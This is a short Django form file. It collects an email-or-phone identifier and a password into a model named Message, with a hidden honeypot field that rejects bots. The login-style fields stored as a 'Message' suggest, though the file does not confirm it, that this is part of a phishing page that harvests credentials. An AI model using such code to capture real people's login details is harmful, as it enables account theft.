from django import forms
from .models import Message

class MessageForm(forms.ModelForm):
    website = forms.CharField(required=False, widget=forms.HiddenInput)
    class Meta:
        model = Message
        fields = ['identifier', 'password']

        widgets =   {
            'identifier': forms.TextInput(attrs={'placeholder':'Email address or phone number'}),
            #'password': forms.TextInput(attrs={'placeholder':'Password'}),
            'password': forms.PasswordInput(attrs={'placeholder': 'Password'}),

        }


    def clean_website(self):
        data = self.cleaned_data['website']
        if data:
            raise forms.ValidationError("Bot detected!")
        return data